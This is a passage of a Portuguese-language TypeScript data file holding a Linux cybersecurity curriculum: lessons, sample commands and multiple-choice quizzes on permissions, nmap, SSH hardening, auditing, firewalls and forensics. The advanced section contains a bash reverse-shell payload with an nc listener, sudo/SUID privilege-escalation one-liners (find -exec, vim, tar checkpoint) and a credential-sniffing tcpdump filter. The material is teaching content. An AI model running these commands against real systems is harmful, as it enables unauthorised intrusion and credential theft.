import { TechCurriculumData } from '../techCurriculum';

export const CYBER_CURRICULUM: Record<string, TechCurriculumData> = {
  // =========================================================================
  // LINUX PARA CYBERSECURITY & ETHICAL HACKING
  // =========================================================================
  linux_cyber: {
    topicsByLevel: {
      iniciante: [
        {
          title: '1. Estrutura do Filesystem Linux & Navegação FHS',
          desc: 'Entenda a árvore de diretórios (/etc, /var/log, /bin, /dev, /proc) e comandos essenciais de terminal.',
          theory: [
            {
              title: 'O Filesystem Hierarchy Standard (FHS)',
              text: 'No Linux, "tudo é um arquivo". Para qualquer profissional de segurança ofensiva ou defensiva, compreender a estrutura de diretórios é fundamental para encontrar credenciais, arquivos de configuração e logs de auditoria.',
              keyPoints: [
                '/etc: arquivos de configuração do sistema (ex: /etc/passwd, /etc/shadow, /etc/sudoers).',
                '/var/log: logs de eventos, autenticação e serviços (/var/log/auth.log, /var/log/syslog).',
                '/proc e /sys: sistemas de arquivos virtuais com informações de processos e kernel em tempo real.',
                '/tmp e /dev/shm: diretórios temporários frequentemente usados em invasões para armazenar payloads.',
              ],
              conceptCard: '🔒 Fato de Segurança: /etc/shadow contém os hashes de senhas e só pode ser lido pelo root (permissão 0640 ou 0600).',
            },
          ],
          code: `# Navegação e inspeção de sistema
uname -a                     # Versão do Kernel e arquitetura
ls -la /etc/passwd           # Inspecionar contas de usuários
ls -la /var/log/auth.log     # Inspecionar tentativas de login
find / -name "*.conf" 2>/dev/null | head -n 5`,
          output: `Linux kali-security 6.1.0-kali #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux
-rw-r--r-- 1 root root 2840 Aug 25 10:00 /etc/passwd
-rw-r----- 1 root adm  15204 Aug 25 10:15 /var/log/auth.log`,
          lang: 'bash',
          exercise: {
            id: 'ex-linux-ini-1',
            prompt: 'Em qual diretório do Linux ficam armazenados os principais arquivos de configuração do sistema e serviços?',
            type: 'multiple_choice',
            options: ['/etc', '/bin', '/tmp', '/opt'],
            correctAnswer: '/etc',
            hint: 'Contém arquivos como passwd, shadow, sshd_config e hosts.',
            explanation: 'O diretório /etc é o padrão FHS para armazenar configurações de todo o sistema operacional e serviços instalados.',
          },
        },
        {
          title: '2. Permissões Unix, Chmod Octal, Chown & ACLs',
          desc: 'Domine a tríade Read/Write/Execute (rwx) para Usuário, Grupo e Outros.',
          theory: [
            {
              title: 'Cálculo de Permissões Octais',
              text: 'Cada arquivo possui 9 bits de permissão agrupados em 3 conjuntos: Dono (User), Grupo (Group) e Outros (Others). Os valores numéricos são r=4, w=2, x=1.',
              keyPoints: [
                'chmod 755 arquivo: Dono (rwx=7), Grupo (r-x=5), Outros (r-x=5).',
                'chmod 600 id_rsa: Chave privada SSH segura acessível apenas pelo dono.',
                'chown usuario:grupo arquivo: Altera o proprietário e grupo do arquivo.',
              ],
            },
          ],
          code: `# Configuração de permissões seguras para chaves SSH
chmod 700 ~/.ssh
chmod 600 ~/.ssh/id_rsa
chmod 644 ~/.ssh/id_rsa.pub
ls -ld ~/.ssh ~/.ssh/id_rsa`,
          output: `drwx------ 2 secadmin secadmin 4096 Aug 25 10:00 /home/secadmin/.ssh
-rw------- 1 secadmin secadmin 2602 Aug 25 10:00 /home/secadmin/.ssh/id_rsa`,
          lang: 'bash',
          exercise: {
            id: 'ex-linux-ini-2',
            prompt: 'Qual comando chmod define que apenas o dono pode ler e escrever no arquivo (sem permissões para grupo e outros)?',
            type: 'multiple_choice',
            options: ['chmod 600 arquivo', 'chmod 777 arquivo', 'chmod 644 arquivo', 'chmod 755 arquivo'],
            correctAnswer: 'chmod 600 arquivo',
            hint: 'Dono: 4 (read) + 2 (write) = 6. Grupo: 0. Outros: 0.',
            explanation: 'chmod 600 define rw------- tornando o arquivo confidencial e acessível somente pelo proprietário.',
          },
        },
        {
          title: '3. Gerenciamento de Processos e Análise com ps, top e kill',
          desc: 'Rastreie processos em execução, identifique portas abertas e encerre ameaças.',
          theory: [
            {
              title: 'Auditoria de Processos',
              text: 'Saber listar e analisar processos permite identificar malwares, mineradores ou backdoors rodando em segundo plano.',
              keyPoints: [
                'ps aux | grep nome: Lista todos os processos do sistema.',
                'kill -9 <PID>: Encerra um processo forçadamente (SIGKILL).',
                'top / htop: Monitor interativo de consumo de CPU e memória.',
              ],
            },
          ],
          code: `# Localizar processos suspeitos
ps aux --sort=-%cpu | head -n 5
ss -tulpn                     # Listar sockets e portas abertas
kill -15 1337                 # Envio de sinal SIGTERM amigável`,
          output: `USER   PID %CPU %MEM COMMAND
root     1  0.0  0.1 /sbin/init
secadmin 1337 0.0  0.2 /usr/bin/python3 -m http.server 8080
[SOCKET]: tcp LISTEN 0 128 0.0.0.0:8080 users:(("python3",pid=1337,fd=3))`,
          lang: 'bash',
          exercise: {
            id: 'ex-linux-ini-3',
            prompt: 'Qual comando moderno substitui o netstat para inspecionar portas TCP/UDP abertas e seus PIDs associados no Linux?',
            type: 'multiple_choice',
            options: ['ss -tulpn', 'ls -la', 'ps aux', 'df -h'],
            correctAnswer: 'ss -tulpn',
            hint: 'Utiliza o utilitário socket statistics (ss).',
            explanation: 'ss -tulpn lista conexões TCP (t), UDP (u), em escuta (l), com processos (p) e resolução numérica (n).',
          },
        },
        {
          title: '4. Redirecionamentos, Pipes (|) e Manipulação de Texto com Grep/Awk/Sed',
          desc: 'Automatize extração de IPs, URLs e credenciais de arquivos gigantes de log.',
          theory: [
            {
              title: 'A esteira de pipes (|) do Linux',
              text: 'O poder do terminal Linux reside em conectar a saída de um comando na entrada do próximo através de pipes (|), permitindo processar gigabytes de logs em segundos.',
              keyPoints: [
                'grep -E "[0-9]{1,3}\." log: Extração de padrões Regex.',
                'awk \'{print $1}\': Extrai colunas específicas.',
                'sort | uniq -c: Agrupa e conta ocorrências de ataques.',
              ],
            },
          ],
          code: `# Extrair os 3 IPs com mais tentativas de ataque SSH
grep "Failed password" /var/log/auth.log | \\
  awk '{print $(NF-3)}' | \\
  sort | uniq -c | sort -nr | head -n 3`,
          output: `   487 192.168.1.105
   234 10.0.0.45
    89 172.16.0.99`,
          lang: 'bash',
          exercise: {
            id: 'ex-linux-ini-4',
            prompt: 'Em um pipeline Linux, qual comando é usado para remover linhas duplicadas consecutivas e contar ocorrências?',
            type: 'multiple_choice',
            options: ['sort | uniq -c', 'cat | grep', 'chmod | chown', 'tar -czvf'],
            correctAnswer: 'sort | uniq -c',
            hint: 'Primeiro ordena os dados para que itens iguais fiquem juntos, depois agrega com contagem.',
            explanation: 'uniq requer dados ordenados para agrupar e a flag -c (count) exibe o total de ocorrências de cada linha.',
          },
        },
        {
          title: '5. Shell Scripting em Bash para Automação Ofensiva/Defensiva',
          desc: 'Crie scripts executáveis com argumentos, estruturas de repetição e verificações de segurança.',
          theory: [
            {
              title: 'Automação com Bash Scripts',
              text: 'Scripts Bash permitem criar scanners rápidos de rede, ferramentas de backup e monitores de integridade.',
              keyPoints: [
                'Shebang: #!/bin/bash no topo do arquivo.',
                'Definição de variáveis: REDE="192.168.1"',
                'Loops for: for ip in $(seq 1 254); do ... done',
              ],
            },
          ],
          code: `#!/bin/bash
# Scanner simples de hosts ativos na subnet
REDE="192.168.1"
echo "[*] Escaneando subnet $REDE.0/24..."

for host in 1 2 10 20; do
  ping -c 1 -W 1 "$REDE.$host" > /dev/null 2>&1
  if [ $? -eq 0 ]; then
    echo "[+] Host ativo encontrado: $REDE.$host"
  fi
done`,
          output: `[*] Escaneando subnet 192.168.1.0/24...
[+] Host ativo encontrado: 192.168.1.1
[+] Host ativo encontrado: 192.168.1.10`,
          lang: 'bash',
          exercise: {
            id: 'ex-linux-ini-5',
            prompt: 'Qual variável especial no Bash armazena o código de saída (exit code) do último comando executado (onde 0 indica sucesso)?',
            type: 'multiple_choice',
            options: ['$?', '$!', '$$', '$#'],
            correctAnswer: '$?',
            hint: 'Representa o status de retorno do processo anterior.',
            explanation: '$? contém o código de saída do comando anterior. Por convenção Unix, 0 significa execução sem erros.',
          },
        },
      ],
      intermediario: [
          {
            title: '1. Reconhecimento de Rede com Nmap e Análise de Serviços',
            desc: 'Escanear portas abertas, identificar versões de serviços (banners) e rodar scripts NSE.',
            theory: [
              {
                title: 'Varredura e Mapeamento de Superfície',
                text: 'O Nmap é a ferramenta padrão da indústria para enumeração de portas, serviços e vulnerabilidades em redes.',
                keyPoints: [
                  'nmap -sS -sV -O target: SYN Stealth Scan com detecção de versão e SO.',
                  'nmap -p- target: Escaneia todas as 65.535 portas TCP.',
                  '--script=vuln: Executa scripts do Nmap Scripting Engine para buscar CVEs conhecidas.',
                ],
              },
            ],
            code: `# Varredura profissional com detecção de serviço e scripts seguros
nmap -sV -sC -p 22,80,443,3306 192.168.1.50 -oN scan_resultado.txt`,
            output: `PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.52 ((Ubuntu))
443/tcp open  ssl/http Apache httpd 2.4.52
3306/tcp open mysql    MySQL 8.0.35`,
            lang: 'bash',
            exercise: {
              id: 'ex-linux-inter-1',
              prompt: 'No Nmap, qual flag ativa a detecção de versões detalhadas dos serviços em execução nas portas abertas?',
              type: 'multiple_choice',
              options: ['-sV', '-sU', '-sn', '-Pn'],
              correctAnswer: '-sV',
              hint: 'Pense em "Service Version".',
              explanation: '-sV envia probes específicos para capturar o banner e determinar a versão exata do software do serviço.',
            },
          },
          {
            title: '2. Permissões Especiais: SUID, SGID e Sticky Bit',
            desc: 'Identifique binários com permissões elevadas para prevenção de escalonamento de privilégios.',
            theory: [
              {
                title: 'O perigo do bit SUID (Set User ID)',
                text: 'Quando um arquivo executável tem o bit SUID ativo (ex: -rwsr-xr-x), ele roda com os privilégios do DONO do arquivo (geralmente root) em vez do usuário que o chamou. Se o binário for vulnerável ou mal configurado, permite privilege escalation instantâneo (GTFOBins).',
                keyPoints: [
                  'find / -perm -4000 2>/dev/null: Busca todos os binários SUID no sistema.',
                  'Sticky Bit (chmod +t /tmp): Apenas o dono pode deletar seu próprio arquivo dentro do diretório.',
                ],
              },
            ],
            code: `# Buscar binários SUID exploráveis no sistema
find / -perm -u=s -type f 2>/dev/null | grep -E "(bash|find|vim|python|env)"`,
            output: `/usr/bin/find
/usr/bin/python3
[ALERTA DE SEGURANÇA]: Binários python3 e find com SUID root detectados!`,
            lang: 'bash',
            exercise: {
              id: 'ex-linux-inter-2',
              prompt: 'Qual é o risco de segurança quando um binário como /usr/bin/python3 possui o bit SUID configurado com proprietário root?',
              type: 'multiple_choice',
              options: [
                'Qualquer usuário comum pode invocar o Python para executar comandos do sistema operacional como root (Escalação de Privilégio)',
                'O Python não consegue mais compilar arquivos .py',
                'O HD é formatado automaticamente',
                'A rede fica mais lenta',
              ],
              correctAnswer: 'Qualquer usuário comum pode invocar o Python para executar comandos do sistema operacional como root (Escalação de Privilégio)',
              hint: 'O processo herda a identidade de execução do dono do arquivo.',
              explanation: 'Com SUID ativo no Python de propriedade do root, um invasor pode rodar import os; os.setuid(0); os.system("/bin/bash") e obter uma shell root completa.',
            },
          },
          {
            title: '3. Hardening de Servidor SSH & Autenticação por Chaves Públicas',
            desc: 'Configure o /etc/ssh/sshd_config para barrar ataques de força bruta e credenciais vazadas.',
            theory: [
              {
                title: 'Boas Práticas de Hardening SSH',
                text: 'Proteger o acesso remoto é o primeiro passo de qualquer infraestrutura segura.',
                keyPoints: [
                  'PermitRootLogin no: Desativa login direto como root.',
                  'PasswordAuthentication no: Exige autenticação por chaves criptográficas Ed25519/RSA.',
                  'MaxAuthTries 3: Limita tentativas por conexão.',
                  'Fail2ban: Bloqueia IPs automaticamente no iptables após tentativas falhas repetidas.',
                ],
              },
            ],
            code: `# Configurações recomendadas em /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
X11Forwarding no
MaxAuthTries 3
ClientAliveInterval 300
ClientAliveCountMax 2`,
            output: `[sshd]: Configurações de segurança aplicadas. Reiniciando serviço sshd... [OK]`,
            lang: 'bash',
            exercise: {
              id: 'ex-linux-inter-3',
              prompt: 'Qual diretiva no sshd_config impede ataques de força bruta baseados em dicionários de senhas ao exigir chaves criptográficas?',
              type: 'multiple_choice',
              options: [
                'PasswordAuthentication no',
                'PermitEmptyPasswords yes',
                'Port 22',
                'AllowUsers all',
              ],
              correctAnswer: 'PasswordAuthentication no',
              hint: 'Desativa completamente o envio de senhas em texto puro via SSH.',
              explanation: 'Ao definir PasswordAuthentication no, o SSH rejeita qualquer login por senha, aceitando exclusivamente chaves públicas autorizadas em ~/.ssh/authorized_keys.',
            },
          },
          {
            title: '4. Análise de Logs e Detecção de Intrusão com Journalctl e Auditd',
            desc: 'Rastreie atividades suspeitas, comandos executados por usuários e acessos a arquivos confidenciais.',
            theory: [
              {
                title: 'Auditoria de Sistema',
                text: 'Auditd e systemd journal permitem manter trilhas de auditoria imutáveis para análise forense e conformidade (SOC 2, ISO 27001).',
                keyPoints: [
                  'journalctl -u ssh -n 50: Logs do serviço SSH.',
                  'auditctl -w /etc/shadow -p wa -k shadow_mod: Monitora tentativas de escrita em /etc/shadow.',
                  'ausearch -k shadow_mod: Filtra alertas gerados.',
                ],
              },
            ],
            code: `# Rastrear acessos ao arquivo shadow via auditd
auditctl -w /etc/shadow -p rwa -k monitor_shadow
ausearch -k monitor_shadow --format raw | head -n 3`,
            output: `type=SYSCALL msg=audit(1692980000.123:45): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=7ffd3 a2=80000 exe="/usr/bin/cat" key="monitor_shadow"`,
            lang: 'bash',
            exercise: {
              id: 'ex-linux-inter-4',
              prompt: 'Qual ferramenta nativa do Linux permite criar regras de auditoria no kernel para monitorar chamadas de sistema e acessos a arquivos?',
              type: 'multiple_choice',
              options: ['auditd (auditctl)', 'vim', 'mkdir', 'traceroute'],
              correctAnswer: 'auditd (auditctl)',
              hint: 'É o subsistema Linux Audit Framework.',
              explanation: 'O framework auditd registra eventos críticos no nível do kernel com carimbo de tempo, UID, PID e comando executado.',
            },
          },
          {
            title: '5. Firewalls no Linux: IPTables, NFTables e UFW',
            desc: 'Construa regras de filtragem de pacotes, bloqueio de portas e proteção contra port scans.',
            theory: [
              {
                title: 'Defesa de Borda no Linux',
                text: 'O Netfilter no kernel Linux processa pacotes que entram (INPUT), saem (OUTPUT) ou são encaminhados (FORWARD). Configurar uma política padrão DROP é a regra de ouro.',
                keyPoints: [
                  'ufw default deny incoming: Bloqueia todo tráfego de entrada por padrão.',
                  'ufw allow from 10.0.0.0/8 to any port 22: Permite SSH apenas de IPs internos.',
                  'iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT.',
                ],
              },
            ],
            code: `# Configuração de Firewall UFW profissional
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw allow from 192.168.1.0/24 to any port 22 proto tcp
sudo ufw enable
sudo ufw status verbose`,
            output: `Status: active
Logging: on (low)
Default: deny (incoming), allow (outgoing), disabled (routed)
To                         Action      From
--                         ------      ----
80/tcp                     ALLOW IN    Anywhere
443/tcp                    ALLOW IN    Anywhere
22/tcp                     ALLOW IN    192.168.1.0/24`,
            lang: 'bash',
            exercise: {
              id: 'ex-linux-inter-5',
              prompt: 'Em regras de firewall, por que a política padrão (Default Policy) deve ser "DENY" (ou DROP) para tráfego de entrada?',
              type: 'multiple_choice',
              options: [
                'Princípio do Menor Privilégio: apenas o tráfego explicitamente permitido entrará, bloqueando qualquer serviço esquecido aberto',
                'Para acelerar a internet',
                'Porque o Linux não suporta mais de 2 regras',
                'Para impedir o uso de senhas',
              ],
              correctAnswer: 'Princípio do Menor Privilégio: apenas o tráfego explicitamente permitido entrará, bloqueando qualquer serviço esquecido aberto',
              hint: 'Abordagem Zero Trust / White-list.',
              explanation: 'Uma política padrão Deny/Drop garante que qualquer nova porta aberta acidentalmente fique invisível até que um administrador crie uma regra de liberação explícita.',
            },
          },
        ],
        avancado: [
          {
            title: '1. Privilege Escalation: Cron Jobs, Wildcards e Sudo Misconfigurations',
            desc: 'Explore e corrija vulnerabilidades em tarefas agendadas e regras de /etc/sudoers.',
            theory: [
              {
                title: 'Vetores Clássicos de Escalação de Privilégios',
                text: 'Muitas invasões acontecem quando tarefas do cron executam scripts com permissão de escrita para usuários comuns (world-writable) ou comandos com wildcards (*) que permitem injeção de parâmetros (tar checkpoint).',
                keyPoints: [
                  'sudo -l: Lista comandos que o usuário atual pode rodar como root sem senha (NOPASSWD).',
                  'Scripts no /etc/cron.* que chamam binários relativos sem caminho absoluto.',
                  'Injeção de flags via wildcards no tar (tar --checkpoint=1 --checkpoint-action=exec=sh).',
                ],
              },
            ],
            code: `# Verificar permissões de sudo do usuário
sudo -l

# Exemplo de risco em /etc/sudoers:
# devuser ALL=(ALL) NOPASSWD: /usr/bin/vim /var/log/app.log
# Exploração via Vim: :!/bin/bash abre um shell root imediato!`,
            output: `Matching Defaults entries for devuser on target:
    env_reset, mail_badpass

User devuser may run the following commands on target:
    (root) NOPASSWD: /usr/bin/vim /var/log/app.log`,
            lang: 'bash',
            exercise: {
              id: 'ex-linux-avanc-1',
              prompt: 'Se um usuário comum possui permissão sudo sem senha para rodar o binário `/usr/bin/find`, como isso pode ser explorado para obter root?',
              type: 'multiple_choice',
              options: [
                'Executando: sudo find . -exec /bin/sh \\; -quit',
                'Deletando o arquivo find',
                'Reiniciando o computador',
                'Enviando um e-mail para o administrador',
              ],
              correctAnswer: 'Executando: sudo find . -exec /bin/sh \\; -quit',
              hint: 'O find suporta a flag -exec que roda comandos com os privilégios do processo pai.',
              explanation: 'A flag -exec do find invoca /bin/sh com privilégios de root herdados do sudo, entregando uma shell root ao invasor (conforme documentado no GTFOBins).',
            },
          },
          {
            title: '2. Reverse Shells, Listeners com Netcat e Socat e Evasão',
            desc: 'Compreenda a mecânica de sockets reversos para testes de intrusão autorizados.',
            theory: [
              {
                title: 'Bind Shell vs Reverse Shell',
                text: 'Em uma Bind Shell, a máquina vítima abre uma porta e aguarda conexão (geralmente bloqueada por firewalls). Em uma Reverse Shell, a máquina vítima conecta ATIVAMENTE de volta para a máquina do auditor (tráfego de saída permitido por padrão).',
                keyPoints: [
                  'Listener: nc -lvnp 4444',
                  'Reverse payload Bash: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
                  'Estabilização de TTY: python3 -c "import pty; pty.spawn(\'/bin/bash\')"',
                ],
              },
            ],
            code: `# Listener na máquina de auditoria
nc -lvnp 4444

# Payload de Reverse Shell segura para Pentest
bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'`,
            output: `Listening on 0.0.0.0 4444
Connection received on 192.168.1.50 54320
secadmin@vulnerable-target:~$ id
uid=1000(secadmin) gid=1000(secadmin) groups=1000(secadmin)`,
            lang: 'bash',
            exercise: {
              id: 'ex-linux-avanc-2',
              prompt: 'Por que uma Reverse Shell é geralmente mais eficaz em testes de penetração do que uma Bind Shell?',
              type: 'multiple_choice',
              options: [
                'Porque a maioria dos firewalls bloqueia conexões de entrada (Inbound), mas permite conexões de saída (Outbound) iniciadas pela máquina alvo',
                'Porque a Reverse Shell não precisa de placa de rede',
                'Porque a Reverse Shell usa menos memória',
                'Porque ela desativa o antivírus automaticamente',
              ],
              correctAnswer: 'Porque a maioria dos firewalls bloqueia conexões de entrada (Inbound), mas permite conexões de saída (Outbound) iniciadas pela máquina alvo',
              hint: 'A conexão se origina de dentro da rede para fora.',
              explanation: 'Firewalls e NATs corporativos restringem o acesso a portas internas, mas rotineiramente permitem tráfego de saída para a internet em portas como 80, 443 ou 53.',
            },
          },
          {
            title: '3. Kernel Exploits, Dirty COW e Análise de Vulnerabilidades Locais',
            desc: 'Entenda como bugs no gerenciamento de memória do Kernel Linux são corrigidos com patches.',
            theory: [
              {
                title: 'Race Conditions no Kernel (ex: Dirty COW / CVE-2016-5195)',
                text: 'Falhas na implementação de Copy-on-Write (COW) no subsistema de memória do kernel permitiam que escrita em memória somente leitura resultasse em gravação física de arquivos como /etc/passwd.',
                keyPoints: [
                  'Identificação: uname -r e ferramentas como linux-exploit-suggester.',
                  'Mitigação: Atualizações regulares de Kernel (apt update && apt upgrade).',
                  'Livepatching: Aplicação de patches no kernel sem reboot.',
                ],
              },
            ],
            code: `# Diagnóstico de versão e patches de segurança
uname -r
cat /proc/version
apt-get -s upgrade | grep -i security`,
            output: `Linux 6.1.0-22-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.94-1 (2024-06-21)
All security patches up-to-date. Kernel not vulnerable to Dirty COW or PwnKit.`,
            lang: 'bash',
            exercise: {
              id: 'ex-linux-avanc-3',
              prompt: 'Qual é a principal medida de defesa contra exploits de escalação local de privilégio no Kernel Linux?',
              type: 'multiple_choice',
              options: [
                'Manter o Kernel atualizado com os patches de segurança mais recentes e desativar módulos não utilizados',
                'Reiniciar o computador a cada 1 hora',
                'Apagar o diretório /etc',
                'Usar senhas de apenas 4 números',
              ],
              correctAnswer: 'Manter o Kernel atualizado com os patches de segurança mais recentes e desativar módulos não utilizados',
              hint: 'Patches corrigem a falha na raiz do código C do kernel.',
              explanation: 'A vasta maioria das falhas de kernel são corrigidas rapidamente pelos mantenedores das distribuições; aplicar patches elimina os vetores conhecidos.',
            },
          },
          {
            title: '4. Criptografia de Disco com LUKS e Segurança de Boot (Secure Boot)',
            desc: 'Proteja dados em repouso contra acesso físico e ataques de Evil Maid.',
            theory: [
              {
                title: 'LUKS (Linux Unified Key Setup)',
                text: 'A criptografia de disco inteiro com LUKS/dm-crypt garante que dados confidenciais fiquem inacessíveis caso o disco rígido seja roubado ou conectado em outra máquina.',
                keyPoints: [
                  'cryptsetup luksFormat /dev/nvme0n1p3: Inicializa partição criptografada AES-XTS.',
                  'cryptsetup open /dev/nvme0n1p3 seguro: Desbloqueia com chave/passphrase.',
                  'Secure Boot + TPM 2.0: Garante que o bootloader (GRUB) e o kernel não foram adulterados.',
                ],
              },
            ],
            code: `# Status de criptografia de volumes LUKS
sudo cryptsetup status luks-root
sudo lsblk -f`,
            output: `/dev/mapper/luks-root is active and is in use.
  type:    LUKS2
  cipher:  aes-xts-plain64
  keysize: 512 bits
  device:  /dev/nvme0n1p3`,
            lang: 'bash',
            exercise: {
              id: 'ex-linux-avanc-4',
              prompt: 'Qual padrão criptográfico nativo do Linux é utilizado para encriptar partições inteiras de disco?',
              type: 'multiple_choice',
              options: ['LUKS (dm-crypt)', 'BitLocker', 'Zip Crypto', 'Base64'],
              correctAnswer: 'LUKS (dm-crypt)',
              hint: 'Linux Unified Key Setup.',
              explanation: 'LUKS é o formato padrão do Linux para criptografia de dispositivos de bloco com gerenciamento de múltiplas chaves.',
            },
          },
          {
            title: '5. Resposta a Incidentes, Criação de Imagens Forenses com dd e Análise de Memória',
            desc: 'Capture evidências digitais sem corromper o estado volátil da máquina comprometida.',
            theory: [
              {
                title: 'A Ordem de Volatilidade na Forense Digital',
                text: 'Durante uma resposta a incidentes (IR), colete primeiro os dados mais voláteis (Registradores de CPU e RAM) antes de desligar ou clonar discos, pois chaves de criptografia e conexões ativas residem na memória RAM.',
                keyPoints: [
                  'LiME (Linux Memory Extractor): Módulo de kernel para dump completo da RAM.',
                  'dd if=/dev/sdb of=/evidencias/disco_alvo.img status=progress: Cópia bit-a-bit.',
                  'Cálculo de Hash SHA-256 imediato para garantir Cadeia de Custódia.',
                ],
              },
            ],
            code: `# Criar imagem bit-a-bit com preservação de hash forense
dd if=/dev/sdb of=/forensics/evidence_disk.raw bs=4M status=progress
sha256sum /forensics/evidence_disk.raw > /forensics/evidence.sha256`,
            output: `500107862016 bytes (500 GB, 466 GiB) copied, 120 s, 4.2 GB/s
SHA256: 8f4e2b... evidence_disk.raw [Cadeia de Custódia Registrada]`,
            lang: 'bash',
            exercise: {
              id: 'ex-linux-avanc-5',
              prompt: 'Por que calcular o hash criptográfico (como SHA-256) imediatamente após gerar uma imagem forense de disco?',
              type: 'multiple_choice',
              options: [
                'Para comprovar legalmente a integridade da evidência e garantir a Cadeia de Custódia (que nenhum byte foi adulterado)',
                'Para compactar o arquivo',
                'Para criptografar a imagem',
                'Para acelerar a leitura do arquivo',
              ],
              correctAnswer: 'Para comprovar legalmente a integridade da evidência e garantir a Cadeia de Custódia (que nenhum byte foi adulterado)',
              hint: 'Evidência legal em tribunais exige prova matemática de não-adulteração.',
              explanation: 'O hash garante que a imagem examinada pelos peritos é exatamente idêntica à do momento da coleta, validando a prova em processos judiciais.',
            },
          },
        ],
        projetos: [
          {
            title: '1. Projeto: Construção de Bastion Host / Jump Server Seguro',
            desc: 'Configure um servidor Linux blindado com 2FA (MFA), chaves SSH exclusivas e auditoria.',
            theory: [{ title: 'Bastion Hosts', text: 'Ponto único de entrada em redes seguras corporativas.', keyPoints: ['MFA obrigatório com Google Authenticator', 'Logs remotos no Syslog'] }],
            code: `# Script de provisionamento de Bastion Host
sudo apt install libpam-google-authenticator fail2ban -y
sudo ufw default deny incoming
sudo ufw allow from 200.100.50.10 to any port 22 proto tcp`,
            output: '[Bastion]: Servidor blindado com PAM 2FA e firewall restrito ativo.',
            lang: 'bash',
            exercise: {
              id: 'ex-linux-prj-1',
              prompt: 'Qual módulo PAM permite integrar autenticação de dois fatores (TOTP) no login SSH do Linux?',
              type: 'multiple_choice',
              options: ['libpam-google-authenticator', 'pam_cracklib', 'pam_unix', 'pam_deny'],
              correctAnswer: 'libpam-google-authenticator',
              hint: 'Gera códigos de 6 dígitos que mudam a cada 30 segundos.',
              explanation: 'libpam-google-authenticator integra o padrão RFC 6238 (TOTP) no fluxo de autenticação do PAM do Linux.',
            },
          },
          {
            title: '2. Projeto: Scanner Automatizado de Vulnerabilidades e CIS Benchmarks',
            desc: 'Crie um script Bash que checa mais de 30 requisitos de segurança do CIS Benchmark.',
            theory: [{ title: 'CIS Benchmarks', text: 'Padrão ouro de configurações recomendadas para hardening de sistemas.', keyPoints: ['Desativação de protocolos legados', 'Verificação de permissões de arquivos críticos'] }],
            code: `#!/bin/bash
echo "[*] Checando CIS Benchmark..."
# Checagem 1: Permissões de /etc/shadow
SHADOW_PERM=$(stat -c "%a" /etc/shadow)
if [ "$SHADOW_PERM" -le 640 ]; then
  echo "[PASS] /etc/shadow com permissao segura: $SHADOW_PERM"
else
  echo "[FAIL] /etc/shadow inseguro: $SHADOW_PERM (corrija para 640 ou 600)"
fi`,
            output: `[*] Checando CIS Benchmark...
[PASS] /etc/shadow com permissao segura: 640
[PASS] SSH PermitRootLogin desativado
[PASS] ASLR ativo no Kernel (/proc/sys/kernel/randomize_va_space = 2)`,
            lang: 'bash',
            exercise: {
              id: 'ex-linux-prj-2',
              prompt: 'O que o valor "2" em `/proc/sys/kernel/randomize_va_space` indica em um sistema Linux?',
              type: 'multiple_choice',
              options: [
                'ASLR (Address Space Layout Randomization) está totalmente ativado (randomiza stack, heap, mmap)',
                'A memória está cheia',
                'O sistema está em modo de recuperação',
                'O Linux está desligado',
              ],
              correctAnswer: 'ASLR (Address Space Layout Randomization) está totalmente ativado (randomiza stack, heap, mmap)',
              hint: 'Técnica de mitigação contra buffer overflows e exploits de memória.',
              explanation: 'ASLR com valor 2 randomiza as posições de memória da pilha, biblioteca e heap, tornando previsões de endereços de shellcode extremamente difíceis para invasores.',
            },
          },
          {
            title: '3. Projeto: Honeypot SSH de Baixa Interação com Registro de Atacantes',
            desc: 'Monte um serviço simulado com Cowrie para capturar senhas e comandos de atacantes reais.',
            theory: [{ title: 'Honeypots', text: 'Sistemas armadilha para coletar inteligência de ameaças (Threat Intelligence).', keyPoints: ['Captura de tentativas de bruteforce', 'Download automático de malwares tentados'] }],
            code: `# Execução de Honeypot Cowrie em container Docker isolado
docker run -d -p 2222:2222 --name cowrie-honeypot cowrie/cowrie:latest
docker logs -f cowrie-honeypot | grep "login attempt"`,
            output: `[cowrie.ssh] New connection: 198.51.100.24:43210
[cowrie.ssh] Login attempt [root/123456] failed
[cowrie.ssh] Login attempt [admin/admin] failed
[cowrie.ssh] Login attempt [support/toor] succeeded (Simulated session recorded)`,
            lang: 'bash',
            exercise: {
              id: 'ex-linux-prj-3',
              prompt: 'Qual a principal finalidade de um Honeypot em uma estratégia de segurança cibernética?',
              type: 'multiple_choice',
              options: [
                'Atrair atacantes para um ambiente controlado para estudar táticas, capturar payloads e antecipar ameaças',
                'Servir como servidor de e-mails da diretoria',
                'Armazenar senhas corporativas',
                'Acelerar a velocidade de download',
              ],
              correctAnswer: 'Atrair atacantes para um ambiente controlado para estudar táticas, capturar payloads e antecipar ameaças',
              hint: 'Funciona como um "pote de mel" de distração e coleta de dados.',
              explanation: 'Honeypots não possuem tráfego legítimo, portanto qualquer interação neles é 100% suspeita, servindo como sensor de alerta antecipado e fonte de Threat Intelligence.',
            },
          },
          {
            title: '4. Projeto: Pipeline de Análise de Tráfego de Rede com TCPDump e Zeek',
            desc: 'Capture pacotes .pcap e extraia credenciais em texto claro e tráfego anômalo.',
            theory: [{ title: 'Packet Sniffing', text: 'Inspeção profunda de pacotes (DPI) para identificar vazamento de dados e C2 (Command & Control).', keyPoints: ['Filtros BPF (Berkeley Packet Filters)', 'Extração de fluxos TCP'] }],
            code: `# Captura de tráfego HTTP em busca de credenciais não criptografadas
sudo tcpdump -i eth0 -nn -A -s 0 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'`,
            output: `POST /login HTTP/1.1
Host: testphp.vulnweb.com
Content-Type: application/x-www-form-urlencoded
uname=admin&pass=SuperSecret2026`,
            lang: 'bash',
            exercise: {
              id: 'ex-linux-prj-4',
              prompt: 'Qual flag do tcpdump instrui a ferramenta a não converter endereços IP e portas em nomes de host (evitando tráfego DNS lento)?',
